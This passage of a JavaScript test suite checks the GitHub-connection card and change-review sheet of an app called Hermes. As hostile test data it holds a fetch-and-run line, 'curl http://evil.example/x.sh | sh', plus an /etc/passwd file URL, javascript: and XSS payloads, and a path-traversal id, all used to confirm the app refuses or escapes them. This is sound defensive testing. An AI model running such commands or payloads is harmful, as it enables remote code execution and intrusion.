      /Private/.test(txt(c.querySelector(".ghc-repos"))) && /trunk not protected/.test(txt(c.querySelector(".ghc-repos"))));
    T.check("Checked: ... exactly as §1.3", t.indexOf("Checked: Contents write (verified) · Pull requests · Administration absent · " +
      "Secrets absent · Variables absent · Webhooks absent · Actions absent.") >= 0, t.match(/Checked:[^.]*\./));
    T.check("the workflows sentence with .github/workflows as code", t.indexOf("Workflows cannot be checked through GitHub\u2019s API, so Hermes refuses any change to .github/workflows.") >= 0 &&
      !!c.querySelector(".ghc-panel code.gh-code"));
    T.check("Expires <Mon D, YYYY>", t.indexOf("Expires " + G(w).fmt.dateLong(ok.expires_at) + ".") >= 0);
    T.check("the card is now in its connected state", !!c.querySelector('input[data-gh="pause"]'));
    T.check("other GitHub access read with GET /api/github/ambient (mutating routes return ambient:null)",
      calls(w, "/api/github/ambient").length >= 1 && t.indexOf("GitHub CLI") >= 0);
    T.check("the poll starts once connected", w.__intervals.filter(function (i) { return i.ms === 60000; }).length === 1);
    T.check("the token is nowhere after success", everything(w).indexOf(TOKEN) < 0);
    w.__click(c.querySelector('button[data-gh="dismiss"]'));
    T.check("Done dismisses the success panel", !card(w).querySelector(".ghc-panel"));
  });

  await scenario("connect: Open GitHub", async function () {
    const w = await page({ routes: { "/api/github/status": statusOff(), "/api/github/create_url": function (url) {
      return { ok: true, url: "https://github.com/settings/personal-access-tokens/new?name=Hermes&contents=write",
               target_name: "octo-owner", repos: [], _asked: url };
    } } });
    let c = await mountCard(w);
    input_(c.querySelector("textarea[data-gh-repos]"), "octo-owner/site\nocto-owner/pub");
    w.__click(c.querySelector('button[data-gh="open"]')); await w.__tick(8);
    const q = calls(w, "/api/github/create_url")[0];
    T.check("asks the LOCAL create_url route with the repositories", !!q && q.url === "/api/github/create_url?repos=" +
      encodeURIComponent("octo-owner/site,octo-owner/pub"));
    T.check("opens github.com in the default browser (window.open _blank noopener)", w.__opened.length === 1 &&
      /^https:\/\/github\.com\/settings\/personal-access-tokens\/new\?/.test(w.__opened[0][0]) &&
      w.__opened[0][1] === "_blank" && w.__opened[0][2] === "noopener");
    T.check("names the resource owner to pick", /choose octo-owner/.test(txt(card(w))));
    T.check("the app window did not navigate", w.location.href === "http://127.0.0.1:7788/");
    T.check("a cold click is honest: it may have been refused after the fetch, so it says to press once more",
      /GitHub should have opened in your browser\. If it did not, press the button once more\./.test(txt(card(w))));
    let n = 0;
    for (const bad of ["file:///etc/passwd", "https://evil.example/settings", "javascript:alert(1)", "http://github.com/x",
                       "https://user:pw@github.com/x"]) {
      w.__routes["/api/github/create_url"] = { ok: true, url: bad };
      w.__opened.length = 0;
      // a different repository list each time: the warm answer is remembered per list
      input_(card(w).querySelector("textarea[data-gh-repos]"), "octo-owner/bad" + (++n));
      w.__click(card(w).querySelector('button[data-gh="open"]')); await w.__tick(8);
      T.check("never opens " + bad, w.__opened.length === 0 && /Could not open GitHub/.test(txt(card(w))));
    }

    // ---- WebKit lets window.open through only inside the owner's click: a warm answer is
    // opened right there, in the click handler (no await between the click and window.open)
    const w2 = await page({ routes: { "/api/github/status": statusOff(), "/api/github/create_url": function () {
      return { ok: true, url: "https://github.com/settings/personal-access-tokens/new?name=Hermes", target_name: "octo-owner", repos: [] };
    } } });
    const c2 = await mountCard(w2);
    T.check("rendering the wizard asks nothing (no request until the owner reaches the button)",
      calls(w2, "/api/github/create_url").length === 0);
    input_(c2.querySelector("textarea[data-gh-repos]"), "octo-owner/site");
    const ob = c2.querySelector('button[data-gh="open"]');
    ob.dispatchEvent(new Event("pointerenter")); await w2.__tick(6);
    T.check("the pointer reaching the button reads create_url once (a local, pure route)",
      calls(w2, "/api/github/create_url").length === 1 &&
      calls(w2, "/api/github/create_url")[0].url === "/api/github/create_url?repos=octo-owner%2Fsite");
    ob.dispatchEvent(new Event("focus")); await w2.__tick(3);
    T.check("...focus on it afterwards does not ask again", calls(w2, "/api/github/create_url").length === 1);
    w2.__click(ob);                                        // NO tick: it must already be open
    T.check("a warm click opens GitHub synchronously, inside the click", w2.__opened.length === 1 &&
      /^https:\/\/github\.com\/settings\/personal-access-tokens\/new\?/.test(w2.__opened[0][0]) &&
      w2.__opened[0][1] === "_blank" && w2.__opened[0][2] === "noopener");
    await w2.__tick(6);
    T.check("...with no second request, and an unqualified 'opened' line", calls(w2, "/api/github/create_url").length === 1 &&
      /^GitHub opened in your browser\. If it asks for a resource owner, choose octo-owner\./.test(
        txt(card(w2).querySelector('.gh-note[role="status"]'))));
    // typing a different list makes the old answer stale: the next press is cold again
    input_(card(w2).querySelector("textarea[data-gh-repos]"), "other/repo");
    w2.__opened.length = 0;
    w2.__click(card(w2).querySelector('button[data-gh="open"]'));
    T.check("a changed repository list is NOT opened from the stale answer", w2.__opened.length === 0);
    await w2.__tick(8);
    T.check("...it fetches the new one, then opens", calls(w2, "/api/github/create_url").length === 2 && w2.__opened.length === 1);
  });

  // =========================================================================
  await scenario("card actions", async function () {
    const st = statusOn();
    let pauseAnswer = null;
    const w = await page({ routes: {
      "/api/github/status": st, "/api/github/ambient": { ok: true, ambient: AMBIENT },
      "/api/github/changes": { ok: true, changes: [] }, "/api/access": { dirs: [] },
      "/api/github/pause": function (url, init) {
        const b = JSON.parse(init.body);
        if (pauseAnswer) return pauseAnswer;
        return Object.assign(statusOn(), { writes_paused: b.paused, paused: { by_owner_switch: b.paused, holds: [] } });
      },
      "/api/github/drift/ack": statusOn({ drift: [], attention: [] }),
      "/api/github/check": { __status: 403, body: { ok: false, error: "owner_only", hint: "Only the owner can do this." } },
      "/api/github/repos": function (url, init) {
        return Object.assign(statusOn(), { added: { full_name: JSON.parse(init.body).repo, enabled: false, enable_blocked: "CI runs with secrets." } });
      },
      "/api/github/revoke": Object.assign(statusOff(), { revoked: true, revoke_status: 202, disconnected: true,
        manage_url: "https://github.com/settings/personal-access-tokens", message: "GitHub accepted the revocation." }),
      "/api/github/disconnect": Object.assign(statusOff(), { disconnected: true, sandboxes_kept: ["/Users/you/HermesSandbox/github/octo-owner/site"],
        manage_url: "https://github.com/settings/personal-access-tokens", hint: "The key is gone from this Mac." })
    } });
    w.hermesNonce = "nonce-0123";
    let c = await mountCard(w);
    change_(c.querySelector('input[data-gh="pause"]'), true); await w.__tick(10);
    const pb = bodies(w, "/api/github/pause");
    T.check("Pause on: POST {paused:true} — a strict boolean", pb.length === 1 && pb[0].paused === true && typeof pb[0].paused === "boolean");
    const pf = calls(w, "/api/github/pause", "POST")[0];
    T.check("X-Hermes-Nonce is sent when window.hermesNonce exists", pf.init.headers["X-Hermes-Nonce"] === "nonce-0123");
    T.check("the switch shows the new state", card(w).querySelector('input[data-gh="pause"]').checked === true &&
      /Paused/.test(txt(card(w).querySelector(".gh-sw"))));
    pauseAnswer = { __status: 409, body: { ok: false, error: "held", holds: [{ id: "expired", text: "Your GitHub key expired." }],
      hint: "GitHub writes stay paused until this is fixed." } };
    change_(card(w).querySelector('input[data-gh="pause"]'), false); await w.__tick(10);
    T.check("Pause off: POST {paused:false}", bodies(w, "/api/github/pause")[1].paused === false);
    T.check("409 held: the hold is explained", /stay paused until this is fixed/.test(txt(card(w))) && /Your GitHub key expired/.test(txt(card(w))));
    T.check("...and the switch is still on", card(w).querySelector('input[data-gh="pause"]').checked === true);

    w.__click(card(w).querySelector('button[data-gh="drift-ack"]')); await w.__tick(10);
    T.check("That was me: POST /api/github/drift/ack {repo, branch}", JSON.stringify(bodies(w, "/api/github/drift/ack")) ===
      JSON.stringify([{ repo: "octo-owner/site", branch: "hermes/odd" }]));
    T.check("...the alert is gone", !card(w).querySelector('button[data-gh="drift-ack"]'));

    w.__click(card(w).querySelector('button[data-gh="check-now"]')); await w.__tick(10);
    T.check("Check now 403 owner_only: explained", /from the Hermes window itself/.test(txt(card(w))));

    w.__click(card(w).querySelector('button[data-gh="repo-on"]')); await w.__tick(10);
    T.check("Enable: POST /api/github/repos {op:add, repo}", JSON.stringify(bodies(w, "/api/github/repos")) ===
      JSON.stringify([{ op: "add", repo: "octo-owner/pub" }]));
    T.check("...a blocked enable says why", /could not be enabled: CI runs with secrets/.test(txt(card(w))));

    w.__confirm = false;
    w.__click(card(w).querySelector('button[data-gh="revoke"]')); await w.__tick(8);
    T.check("Revoke now asks first (confirm false: nothing sent)", calls(w, "/api/github/revoke").length === 0);
    w.__confirm = true;
    w.__click(card(w).querySelector('button[data-gh="revoke"]')); await w.__tick(10);
    T.check("Revoke now: POST /api/github/revoke", calls(w, "/api/github/revoke", "POST").length === 1);
    T.check("...the message and the tokens-page link", /GitHub accepted the revocation/.test(txt(card(w))) &&
      !!card(w).querySelector('button[data-gh="link"][data-url="https://github.com/settings/personal-access-tokens"]'));
    T.check("...back to the connect wizard", !!card(w).querySelector("input[data-gh-token]"));
    T.check("...and the poll stopped", !w.__intervals.some(function (i) { return i.ms === 60000; }));

    // disconnect, on a fresh connected page
    const w2 = await page({ routes: { "/api/github/status": statusOn(), "/api/github/ambient": { ok: true, ambient: AMBIENT },
      "/api/github/changes": { ok: true, changes: [] }, "/api/access": { dirs: [] },
      "/api/github/disconnect": Object.assign(statusOff(), { disconnected: true, sandboxes_kept: ["/Users/you/HermesSandbox/github/octo-owner/site"],
        manage_url: "https://github.com/settings/personal-access-tokens", hint: "The key is gone from this Mac." }) } });
    await mountCard(w2);
    w2.__confirm = false;
    w2.__click(card(w2).querySelector('button[data-gh="disconnect"]')); await w2.__tick(8);
    T.check("Disconnect asks first", calls(w2, "/api/github/disconnect").length === 0);
    w2.__confirm = true;
    w2.__click(card(w2).querySelector('button[data-gh="disconnect"]')); await w2.__tick(10);
    T.check("Disconnect: POST, the hint and the kept sandboxes", calls(w2, "/api/github/disconnect", "POST").length === 1 &&
      /The key is gone from this Mac/.test(txt(card(w2))) && /Sandboxes kept/.test(txt(card(w2))));
    const w3 = await page({ routes: { "/api/github/status": statusOn(), "/api/github/pause": statusOn() } });
    await mountCard(w3);
    change_(card(w3).querySelector('input[data-gh="pause"]'), true); await w3.__tick(8);
    T.check("no window.hermesNonce: no X-Hermes-Nonce header", calls(w3, "/api/github/pause", "POST")[0].init.headers["X-Hermes-Nonce"] === undefined);
  });

  await scenario("card: a repaint never wipes a field being typed in", async function () {
    const w = await page({ routes: { "/api/github/status": statusOff() } });
    let c = await mountCard(w);
    const tok = c.querySelector("input[data-gh-token]");
    tok.focus();
    tok.value = "github_pat_partial";
    G(w).paintCard(false);
    T.check("a background repaint skips the card while its field has focus", card(w).querySelector("input[data-gh-token]") === tok &&
      tok.value === "github_pat_partial");
    T.check("the token field is described by its helper line", tok.getAttribute("aria-describedby") === "ghcard-token-help" &&
      /Never shown again/.test(txt(w.document.getElementById("ghcard-token-help"))));
    tok.value = "";
    const w2 = await page({ routes: { "/api/github/status": statusOn({ drift: [], attention: [] }),
      "/api/github/changes": { ok: true, changes: [] }, "/api/access": { dirs: [] } } });
    await mountCard(w2);
    const sw = card(w2).querySelector('input[data-gh="pause"]');
    sw.focus();
    const before = card(w2).querySelector('input[data-gh="pause"]');
    G(w2).paintCard(false);
    T.check("a focused switch (not a text field) does not hold back a repaint", card(w2).querySelector('input[data-gh="pause"]') !== before);
  });

  // =========================================================================
  await scenario("review sheet: content and escaping", async function () {
    const ch = change(ID1);
    const w = await page({ routes: { "/api/github/status": statusOff(), "/api/github/changes": function (url) {
      return url.indexOf("?id=" + ID1) > 0 ? { ok: true, change: ch } : { ok: true, changes: [] };
    } } });
    T.check("openReview refuses a malformed id (no request)", (await G(w).openReview("../../etc")) === false &&
      calls(w, "/api/github/changes").length === 0);
    w.document.getElementById("outside").focus();
    await G(w).openReview(ID1); await w.__tick(10);
    const s = sheet(w);
    T.check("GET /api/github/changes?id=<id>", calls(w, "/api/github/changes")[0].url === "/api/github/changes?id=" + ID1);
    T.check("full-viewport dialog: role=dialog aria-modal labelled by its heading", !!s && !s.hidden &&
      s.getAttribute("role") === "dialog" && s.getAttribute("aria-modal") === "true" && s.getAttribute("aria-labelledby") === "gh-rv-h");
    T.check("appended to <body>, outside every <header>", s.parentNode === w.document.body && !s.closest("header"));
    const t = txt(s).replace(/\s+/g, " ");
    T.check("header: repo + Public chip", /octo-owner\/pub\s*Public/.test(txt(s.querySelector(".ghr-meta"))));
    T.check("hermes/<slug>", t.indexOf("hermes/fix-copy") >= 0);
    T.check("based on main @ abc1234 (2 h ago)", t.indexOf("based on main @ abc1234 (2 h ago)") >= 0, t.match(/based on[^)]*\)/));
    T.check("'What happens if you approve' line", /What happens if you approve: Hermes pushes one commit to a new branch, hermes\/fix-copy, on octo-owner\/pub/.test(t) &&
      /Nothing is merged, main is never touched/.test(t) && /This repository is public/.test(t));
    T.check("focus moved into the sheet (its heading)", w.document.activeElement === s.querySelector("#gh-rv-h"));
    // checks
    const warns = s.querySelectorAll("input[data-ack]");
    // logo.png's tick is the SERVER's C-binary warning (E02): the sheet adds no
    // ui:binary tick of its own for a file a warn check already covers
    T.check("each warn row has its own tick bound to its ack id", warns.length === 4 &&
      JSON.stringify(Array.from(warns).map(function (x) { return x.getAttribute("data-ack"); })) ===
      JSON.stringify(["C-unicode", "C-unicode:2", "C-secret-shape", "C-binary"]));
    T.check("the public confirm is a tick of its own", s.querySelectorAll("input[data-confirm-public]").length === 1);
    T.check("info rows have no tick", !!s.querySelector(".ghr-ck.info") && !s.querySelector(".ghr-ck.info input"));
    T.check("the server's ⟦U+XXXX⟧ markers are shown as-is (and highlighted)", t.indexOf("abc\u27e6U+202E\u27e7def") >= 0 &&
      !!s.querySelector(".ghr-samples .gh-hid"));
    T.check("sample overflow: 'and N more'", /and 3 more/.test(t));
    T.check("a shape check on the description renders with no path", /shaped like a credential/.test(t));
    T.check("binary check: size + sha256 prefix (in the server's warning text)", /2048 bytes, sha256 0123456789abcdef/.test(t));
    // files
    T.check("file list with +/−", /README\.md\s*\+3 −1/.test(txt(s.querySelector(".ghr-files"))));
    T.check("binary file rows are collapsed (no +/−)", /logo\.png\s*binary · 2\.0 KB/.test(txt(s.querySelector(".ghr-files"))));
    T.check("rename shows old → new, an exec bit is flagged", t.indexOf("src/old.sh → src/") >= 0 && /now executable/.test(t));
    // diff
    const diff = s.querySelector(".ghd");
    T.check("diff: added / removed / hunk / meta lines classed", diff.querySelectorAll(".ghd-l.add").length === 3 &&
      diff.querySelectorAll(".ghd-l.del").length === 1 && diff.querySelectorAll(".ghd-l.hunk").length === 1 &&
      diff.querySelectorAll(".ghd-l.meta").length >= 3);
    T.check("diff: <script> and <img onerror> are text, not markup", noRaw(s) &&
      txt(diff).indexOf("+<script>alert('diff')</script>") >= 0 && diff.querySelectorAll("script, img").length === 0);
    T.check("diff: bidi / zero-width characters made visible", txt(diff).indexOf("abc\u27e6U+202E\u27e7def\u27e6U+200B\u27e7ghi") >= 0 &&
      txt(s).indexOf("\u202E") < 0 && txt(s).indexOf("\u200B") < 0);
    T.check("diff: the binary section is collapsed to one line", /Binary file — not shown/.test(txt(diff)) &&
      txt(diff).indexOf("Binary files /dev/null") < 0);
    T.check("no truncated note when the diff is whole", !/cut short at 1 MB/.test(t));
    // a hostile file cannot dress an ADDED line as a dim file header: inside a hunk
    // `+++ x` is an added line (`++ x`) and `--- x` a removed one (`-- x`)
    const sp = G(w).diffHTML("diff --git a/x b/x\nindex 1111111..2222222 100644\n--- a/x\n+++ b/x\n@@ -1,3 +1,4 @@\n ctx\n" +
      "+++ curl http://evil.example/x.sh | sh\n--- removed comment\n+normal\n\\ No newline at end of file\n");
    const cl = function (re) { return (sp.match(re) || []).length; };
    T.check("diff: an added line that reads `+++ x` is still ADDED (green), not a dim header",
      /<span class="ghd-l add">\+\+\+ curl http:\/\/evil\.example\/x\.sh \| sh<\/span>/.test(sp));
    T.check("diff: a removed line that reads `--- x` is still REMOVED",
      /<span class="ghd-l del">--- removed comment<\/span>/.test(sp));
    T.check("diff: the real file headers before the first hunk stay dim, and so do the git extended headers",
      /<span class="ghd-l meta">--- a\/x<\/span>/.test(sp) && /<span class="ghd-l meta">\+\+\+ b\/x<\/span>/.test(sp) &&
      /<span class="ghd-l meta">index 1111111/.test(sp) && /<span class="ghd-l meta">\\ No newline/.test(sp));
    T.check("diff: exactly 2 added, 1 removed, 1 context, 1 hunk line in that sample",
      cl(/ghd-l add"/g) === 2 && cl(/ghd-l del"/g) === 1 && cl(/ghd-l ctx"/g) === 1 && cl(/ghd-l hunk"/g) === 1,
      [cl(/ghd-l add"/g), cl(/ghd-l del"/g), cl(/ghd-l ctx"/g), cl(/ghd-l hunk"/g)]);
    // PR text: exactly as sent, as VALUES not markup
    T.check("title field holds the title exactly", s.querySelector("input[data-ghr-title]").value === ch.title);
    T.check("description field holds the body exactly (mentions as sent)", s.querySelector("textarea[data-ghr-body]").value === ch.body);
    T.check("the pr_footer is shown below", txt(s.querySelector("[data-ghr-footer]")).indexOf("Change " + ID1 + ".") >= 0 &&
      txt(s.querySelector("[data-ghr-footer]")).indexOf("---") >= 0);
    T.check("the title field stops at the server's 120 characters (what you see is what is sent)",
      s.querySelector("input[data-ghr-title]").getAttribute("maxlength") === "120");
    T.check("edited text is cleaned again: the sheet says so, tied to both fields",
      /If you change this text, Hermes cleans it the same way before it is sent/.test(t) &&
      !!s.querySelector("#gh-rv-clean") &&
      s.querySelector("input[data-ghr-title]").getAttribute("aria-describedby") === "gh-rv-clean" &&
      s.querySelector("textarea[data-ghr-body]").getAttribute("aria-describedby") === "gh-rv-clean gh-rv-count");
    T.check("the sanitising Hermes did is disclosed", /removed 1 hidden comment, wrapped 2 @mentions so nobody is notified/.test(t));
    T.check("the heading escapes the hostile title", txt(s.querySelector("#gh-rv-h")).indexOf("<img src=x") >= 0 &&
      s.querySelectorAll("#gh-rv-h img").length === 0);
    T.check("three decisions with the design's labels", txt(s.querySelector('button[data-ghr="push_pr"]')).trim() === "Push and open draft PR" &&
      txt(s.querySelector('button[data-ghr="push_only"]')).trim() === "Push branch only" &&
      txt(s.querySelector('button[data-ghr="reject"]')).trim() === "Reject");

    // truncated + a long diff
    const big = change(ID2, { diff_truncated: true, diff: "diff --git a/x b/x\n" + Array.from({ length: 3500 }, function (_, i) { return "+l" + i; }).join("\n") });
    w.__routes["/api/github/changes"] = { ok: true, change: big };
    await G(w).openReview(ID2); await w.__tick(10);
    T.check("truncated note", /cut short at 1 MB/.test(txt(sheet(w))));
    T.check("a long diff renders its first 3000 lines and offers the rest", sheet(w).querySelectorAll(".ghd-l").length === 3000 &&
      /Show the remaining 500 lines/.test(txt(sheet(w))));
    w.__click(sheet(w).querySelector('button[data-ghr="diff-all"]'));
    T.check("...which renders on request", sheet(w).querySelectorAll(".ghd-l").length === 3500);
    w.__routes["/api/github/changes"] = { __status: 404, body: { ok: false, error: "not_found" } };
    await G(w).openReview(ID3); await w.__tick(10);
    T.check("404: 'no longer exists'", /no longer exists/.test(txt(sheet(w))) && !sheet(w).querySelector('button[data-ghr="push_pr"]'));
  });

  await scenario("review sheet: approve gating, digest + acks, every refusal", async function () {
    let ch = change(ID1);
    let answer = null, gets = 0;
    const w = await page({ routes: { "/api/github/status": statusOff(),
      "/api/github/changes": function (url) { if (url.indexOf("?id=") > 0) { gets++; return { ok: true, change: ch }; } return { ok: true, changes: [] }; },
      "/api/github/changes/decide": function () { return typeof answer === "function" ? answer() : answer; } } });
    w.hermesNonce = "nonce-xyz";
    await G(w).openReview(ID1); await w.__tick(10);
    let s = sheet(w);
    const pr = function () { return sheet(w).querySelector('button[data-ghr="push_pr"]'); };
    const po = function () { return sheet(w).querySelector('button[data-ghr="push_only"]'); };
    T.check("approve starts disabled", pr().disabled && po().disabled);
    T.check("...and says why", /Tick every warning above to approve \(4 left\)/.test(txt(s.querySelector("[data-ghr-why]"))));
    T.check("Reject is available at once", !s.querySelector('button[data-ghr="reject"]').disabled);
    const acks = s.querySelectorAll("input[data-ack]");
    change_(acks[0], true); change_(acks[1], true);
    T.check("two of three ticks: still disabled", pr().disabled && /2 left/.test(txt(s.querySelector("[data-ghr-why]"))));
    change_(acks[2], true);
    T.check("three warnings ticked, the binary file's not: still disabled", pr().disabled &&
      /1 left/.test(txt(s.querySelector("[data-ghr-why]"))));
    change_(acks[3], true);
    T.check("every warn ticked but public not confirmed: still disabled", pr().disabled &&
      /Confirm that this repository is public/.test(txt(s.querySelector("[data-ghr-why]"))));
    change_(s.querySelector("input[data-confirm-public]"), true);
    T.check("all ticks + the public confirm: enabled", !pr().disabled && !po().disabled);
    change_(acks[1], false);
    T.check("unticking one disables again", pr().disabled);
    change_(acks[1], true);
    input_(s.querySelector("input[data-ghr-title]"), "   ");
    T.check("an empty title disables approve", pr().disabled && /needs a title/.test(txt(s.querySelector("[data-ghr-why]"))));
    input_(s.querySelector("input[data-ghr-title]"), ch.title);
    T.check("...restoring it enables", !pr().disabled);
    // a click on a disabled button does nothing
    T.check("no decide request yet", calls(w, "/api/github/changes/decide").length === 0);

    // 403 owner_only
    answer = { __status: 403, body: { ok: false, error: "owner_only", hint: "Only the owner can do this." } };
    w.__click(pr()); await w.__tick(10);
    let sent = bodies(w, "/api/github/changes/decide");
    T.check("push_pr sends {id, digest, decision, acks[], confirm_public:true} and no unedited text",
      sent.length === 1 && JSON.stringify(sent[0]) === JSON.stringify({ id: ID1, digest: "d".repeat(64), decision: "push_pr",
        acks: ["C-unicode", "C-unicode:2", "C-secret-shape", "C-binary"], confirm_public: true }), sent[0]);
    const df = calls(w, "/api/github/changes/decide", "POST")[0];
    T.check("decide is a same-origin fetch with the nonce", df.url === "/api/github/changes/decide" &&
      df.init.credentials === "same-origin" && df.init.headers["X-Hermes-Nonce"] === "nonce-xyz");
    T.check("403 owner_only: approve from the dashboard window", /from the Hermes window itself/.test(txt(sheet(w))));
    T.check("...the ticks survive (nothing changed)", sheet(w).querySelectorAll("input[data-ack][checked]").length === 4 && !pr().disabled);

    // 422 needs_ack
    answer = { __status: 422, body: { ok: false, error: "needs_ack", needs_ack: ["C-unicode:2"] } };
    w.__click(pr()); await w.__tick(10);
    T.check("422 needs_ack: the missing row is highlighted", !!sheet(w).querySelector('.ghr-ck.missing input[data-ack="C-unicode:2"]') &&
      /Tick every warning first/.test(txt(sheet(w))));
    // 422 secret_in_text, with an edited title
    answer = { __status: 422, body: { ok: false, error: "secret_in_text" } };
    input_(sheet(w).querySelector("input[data-ghr-title]"), "Edited title");
    w.__click(pr()); await w.__tick(10);
    sent = bodies(w, "/api/github/changes/decide");
    T.check("an edited title is sent", sent[sent.length - 1].title === "Edited title" && !("body" in sent[sent.length - 1]));
    T.check("422 secret_in_text explained", /saved secret values/.test(txt(sheet(w))));
    T.check("...the edit survives the repaint", sheet(w).querySelector("input[data-ghr-title]").value === "Edited title");
    // 429 + 500
    answer = { __status: 429, body: { ok: false, error: "push_budget", hint: "Hermes has used today's 10 pushes." } };
    w.__click(pr()); await w.__tick(10);
    T.check("429: the budget hint", /used today's 10 pushes/.test(txt(sheet(w))));
    const g0 = gets;
    answer = { __status: 502, body: { ok: false, error: "push_failed", hint: "GitHub refused the push." } };
    w.__click(po()); await w.__tick(10);
    T.check("push_only sends decision push_only", bodies(w, "/api/github/changes/decide").pop().decision === "push_only");
    T.check("5xx: hint + the change is reloaded", /GitHub refused the push/.test(txt(sheet(w))) && gets === g0 + 1);
    // 409 stale: reload, reset
    ch = change(ID1, { digest: "9".repeat(64), title: "Changed upstream" });
    answer = { __status: 409, body: { ok: false, error: "stale", stale: true } };
    w.__click(pr()); await w.__tick(12);
    T.check("409 stale: says so and reloads", /updated or decided somewhere else/.test(txt(sheet(w))) && gets === g0 + 2);
    T.check("...the new content replaces the old, every tick reset", sheet(w).querySelectorAll("input[data-ack][checked]").length === 0 &&
      sheet(w).querySelector("input[data-ghr-title]").value === "Changed upstream" && pr().disabled);
    // success
    Array.from(sheet(w).querySelectorAll("input[data-ack]")).forEach(function (x) { change_(x, true); });
    change_(sheet(w).querySelector("input[data-confirm-public]"), true);
    answer = function () {
      // the pipeline moved the change on: the reload that follows sees pr_open
      ch = change(ID1, { state: "pr_open", digest: "9".repeat(64), decided_at: NOW, pushed_sha: "f".repeat(40),
        pr: { number: 12, url: "https://github.com/octo-owner/pub/pull/12", draft: true } });
      return { ok: true, state: "pr_open", pushed_sha: "f".repeat(40), notified: true,
        pr: { number: 12, url: "https://github.com/octo-owner/pub/pull/12", draft: true }, change: summary(ID1, { state: "pr_open" }) };
    };
    w.__click(pr()); await w.__tick(14);
    sent = bodies(w, "/api/github/changes/decide");
    T.check("after a stale reload the NEW digest is sent", sent[sent.length - 1].digest === "9".repeat(64));
    s = sheet(w);
    T.check("the decide result is shown", /opened draft pull request #12/.test(txt(s)));
    T.check("no approve buttons on a decided change", !s.querySelector('button[data-ghr="push_pr"]'));
    w.__opened.length = 0;
    w.__click(s.querySelector('button[data-ghr="open-pr"]'));
    T.check("the PR link opens in the default browser", w.__opened.length === 1 && w.__opened[0][0] === "https://github.com/octo-owner/pub/pull/12");
    T.check("Retract is offered on a pushed change", !!s.querySelector('button[data-ghr="retract"]'));
    // retract
    w.__routes["/api/github/changes/retract"] = { ok: true, state: "retracted", pr_closed: true, change: summary(ID1, { state: "retracted" }) };
    w.__confirm = false;
    w.__click(s.querySelector('button[data-ghr="retract"]')); await w.__tick(8);
    T.check("Retract asks first (confirm false: nothing sent)", calls(w, "/api/github/changes/retract").length === 0);
    w.__confirm = true;
    ch = change(ID1, { state: "retracted", retracted_at: NOW, digest: "9".repeat(64) });
    w.__click(sheet(w).querySelector('button[data-ghr="retract"]')); await w.__tick(12);
    const rb = bodies(w, "/api/github/changes/retract");
    T.check("Retract: POST {id} with the nonce", rb.length === 1 && JSON.stringify(rb[0]) === JSON.stringify({ id: ID1 }) &&
      calls(w, "/api/github/changes/retract", "POST")[0].init.headers["X-Hermes-Nonce"] === "nonce-xyz");
    T.check("...and says the branch is gone and the PR closed", /Retracted\. The branch is gone from GitHub and the pull request is closed/.test(txt(sheet(w))));
  });

  await scenario("review sheet: blocked, reject, Esc, close, focus trap", async function () {
    const blocked = change(ID1, { approvable: false, blocked: true, checks: [
      { id: "C-secret-known", level: "block", text: "Added lines contain one of your saved secret values (" + HOSTILE + ")." },
      { id: "C-unicode", level: "warn", ack: "C-unicode", text: "hidden" }], needs_ack: ["C-unicode"], confirm_public: false, private: true });
    const w = await page({ routes: { "/api/github/status": statusOff(),
      "/api/github/changes": function () { return { ok: true, change: blocked }; },
      "/api/github/changes/decide": { ok: true, state: "rejected", change: summary(ID1, { state: "rejected" }) } } });
    const opener = w.document.getElementById("outside");
    opener.focus();
    await G(w).openReview(ID1); await w.__tick(10);
    let s = sheet(w);
    change_(s.querySelector("input[data-ack]"), true);
    T.check("a block check keeps approve disabled even with every tick", s.querySelector('button[data-ghr="push_pr"]').disabled &&
      /A check blocks this change/.test(txt(s.querySelector("[data-ghr-why]"))));
    T.check("the block row is marked and escaped", !!s.querySelector(".ghr-ck.block") && noRaw(s));
    T.check("a private repo has no public confirm", !s.querySelector("input[data-confirm-public]"));
    // focus trap
    const list = Array.from(s.querySelectorAll("button:not([disabled]),input:not([disabled]),textarea:not([disabled]),[tabindex]:not([tabindex=\"-1\"])"));
    const last = list[list.length - 1], first = list[0];
    last.focus();
    let ev = w.__key(last, "Tab");
    T.check("Tab on the last control wraps to the first", ev.defaultPrevented && w.document.activeElement === first);
    ev = w.__key(first, "Tab", { shiftKey: true });
    T.check("Shift+Tab on the first wraps to the last", ev.defaultPrevented && w.document.activeElement === last);
    opener.focus();       // focus escaped somehow: Tab brings it back in
    ev = w.__key(opener, "Tab");
    T.check("Tab from outside the open sheet lands inside it", ev.defaultPrevented && s.contains(w.document.activeElement));
    // Esc closes WITHOUT deciding
    ev = w.__key(w.document.activeElement, "Escape");
    T.check("Esc closes the sheet", ev.defaultPrevented && sheet(w).hidden === true);
    T.check("...without any decide request", calls(w, "/api/github/changes/decide").length === 0);
    T.check("...and gives focus back to what had it", w.document.activeElement === opener);
    // the close button
    await G(w).openReview(ID1); await w.__tick(10);
    w.__click(sheet(w).querySelector('button[data-ghr="close"]'));
    T.check("the close button closes without deciding", sheet(w).hidden && calls(w, "/api/github/changes/decide").length === 0);
    // reject
    await G(w).openReview(ID1); await w.__tick(10);
    w.__click(sheet(w).querySelector('button[data-ghr="reject"]')); await w.__tick(10);
    T.check("Reject sends only {id, digest, decision:'reject'}", JSON.stringify(bodies(w, "/api/github/changes/decide")) ===
      JSON.stringify([{ id: ID1, digest: "d".repeat(64), decision: "reject" }]));
    T.check("...and shows it", /Rejected\. Nothing was pushed/.test(txt(sheet(w))));
    T.check("pure gate(): no change is never approvable", G(w).gate(null, {}).ok === false);
  });

  // =========================================================================
  await scenario("review sheet: an answer that arrives after Esc", async function () {
    const pushedChange = function (extra) {
      return change(ID1, Object.assign({ state: "pr_open", digest: "9".repeat(64), decided_at: NOW, pushed_sha: "f".repeat(40),
        pr: { number: 12, url: "https://github.com/octo-owner/pub/pull/12", draft: true } }, extra || {}));
    };
    // ---- Approve: the owner presses Esc while the push is in flight
    let ch = change(ID1);
    const hold = deferred();
    const w = await page({ routes: { "/api/github/status": statusOff(),
      "/api/github/changes": function (url) { return url.indexOf("?id=") > 0 ? { ok: true, change: ch } : { ok: true, changes: [] }; },
      "/api/github/changes/decide": function () {
        return hold.p.then(function () {
          ch = pushedChange();
          return { ok: true, state: "pr_open", pushed_sha: "f".repeat(40), notified: true,
            pr: { number: 12, url: "https://github.com/octo-owner/pub/pull/12", draft: true }, change: summary(ID1, { state: "pr_open" }) };
        });
      } } });
    await G(w).openReview(ID1); await w.__tick(10);
    Array.from(sheet(w).querySelectorAll("input[data-ack]")).forEach(function (x) { change_(x, true); });
    change_(sheet(w).querySelector("input[data-confirm-public]"), true);
